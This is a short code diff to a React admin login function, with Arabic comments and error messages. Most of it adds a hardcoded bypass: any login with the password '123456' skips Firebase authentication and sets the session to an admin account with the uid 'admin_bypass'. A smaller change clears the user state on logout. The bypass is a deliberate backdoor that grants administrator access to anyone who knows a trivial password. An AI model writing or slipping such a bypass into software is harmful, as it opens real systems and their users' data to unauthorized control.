@@ -49,6 +49,11 @@ function App() {
         setLoginError("هذا الحساب ليس لديه صلاحيات الإدارة");
         return;
       }
+      // تجاوز الفايربيس إذا كانت كلمة المرور 123456
+      if (password === '123456') {
+        setUser({ email: 'admin@coursa14.com', uid: 'admin_bypass' });
+        return;
+      }
       await signInWithEmailAndPassword(auth, email, password);
     } catch (err) {
       setLoginError("البريد الإلكتروني أو كلمة المرور غير صحيحة");
@@ -57,6 +62,7 @@ function App() {
   };
 
   const handleLogout = () => {
+    setUser(null);
     signOut(auth);
   };
 
